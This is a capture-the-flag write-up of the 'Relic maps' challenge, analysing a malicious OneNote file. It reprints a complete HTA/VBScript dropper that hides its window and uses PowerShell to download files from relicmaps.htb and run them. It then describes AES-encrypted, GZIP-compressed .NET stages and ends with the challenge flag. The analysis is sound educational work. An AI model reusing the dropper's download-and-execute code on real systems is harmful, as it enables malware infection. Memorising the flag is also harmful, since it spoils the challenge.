# Relic maps (medium)
The challenge prompts us to go the a URL, so I went to it and downloaded the `relicmaps.one` file.
The `file` command returns nothing interesting, so I ran `strings` on the blob.

The result contains an interesting piece of code:
```html
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
<script type="text/vbscript">
' Exec process using WMI
Function WmiExec(cmdLine ) 
    Dim objConfig 
    Dim objProcess 
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function
Private Function dukpatek(myObjP , myObjC , myCmdL ) 
    Dim procId 
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
	    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub
' Exec process using WScript.Shell (asynchronous)
Sub WscriptExec(cmdLine )
    CreateObject("WScript.Shell").Run cmdLine, 0
End Sub
Sub ExecuteCmdAsync(targetPath )
    On Error Resume Next
    Err.Clear
    wimResult = WmiExec(targetPath)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        WscriptExec targetPath
    End If
    On Error Goto 0
End Sub
window.resizeTo 0,0
AutoOpen
Close
</script>
</head>
<body>
</body>
</html>
```

We see that 2 URLs are downloaded from and then executed.
The first URL returns a 404, however the second one returns a new bat script I have saved in `stage2.bat`.

This bash script is a bit obfuscated, although it is not difficult to reverse it.

Basically we have a bunch of `set` statements that set some arbitrary string to a few characters.
At the end of the file all these random strings are concatenated to form the script.

I have extracted all the defined string into the `s2defs.txt` file and used regex to convert the concatenation part at the bottom of the `bat` file to a nice one token per line string, which can be found in `ext.py`.

The script parses all *defs* and substitutes the corresponding string into the concatenated string to deobfuscate the script.

The full deobfuscated script can be seen in `nice2.bat`.
This script invokes a powershell command that executed the script passed as the argument.

I felt it wasn't too hard to read, so I didn't separately deobfuscate it.
* Reads each line of the original `stage2.bat` until `::` is found (this is a comment in `.bat` syntax), it contains a long base64 string in our case, and decodes it
* Creates and AES CBC cipher with PKCS7 padding with key and iv decoded from base64 strings.
* The decoded string is decrypted using the AES cipher
* The resulting bytes are GZIP decompressed
* The resulting bytes are interpreted as a .NET assembly an are invoked directly from the powershell script

I wrote `dec.py` to carry out this decryption process, the result is saved in `stage3.bin`, which is indeed a .NET assembly.

I loaded the assembly into ILSpy and the flag was waiting for me in the `Main` function in a variable

```cs
string text = "HTB{0neN0Te?_iT'5_4_tr4P!}";
```
